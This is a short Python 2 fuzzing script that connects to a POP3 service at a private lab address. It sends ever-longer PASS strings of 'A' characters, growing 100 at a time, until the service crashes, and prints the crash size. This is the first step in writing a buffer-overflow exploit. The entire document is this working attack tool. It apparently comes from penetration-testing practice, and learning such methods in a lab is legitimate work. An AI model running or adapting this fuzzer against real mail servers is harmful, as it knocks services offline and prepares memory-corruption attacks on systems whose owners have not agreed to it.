#!/usr/bin/python
import socket, sys
from time import sleep

buffer="A"*100

#UN=raw_input("Enter A username: ")	
#target=raw_input("Enter Target IP: ")	
#Tport=raw_input("Enter Target Port: ")	
UN='username'
target='10.11.20.153'
Tport=110

while True:
	try:	
		print "Sending Buffer of size %s"% str(len(buffer))
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		connect=s.connect((target,Tport))
		s.recv(1024)
		#command to send with param we are trying to overflow
		s.send('USER '+UN+'\r\n')
		s.recv(1024)
		s.send('PASS '+buffer+'\r\n')
		s.send('QUIT')	
		s.close()
		sleep(1)
		
		buffer = buffer + "A"*100
		
	except:
		print "Crashed at %s Bytes" % str(len(buffer))
		sys.exit()
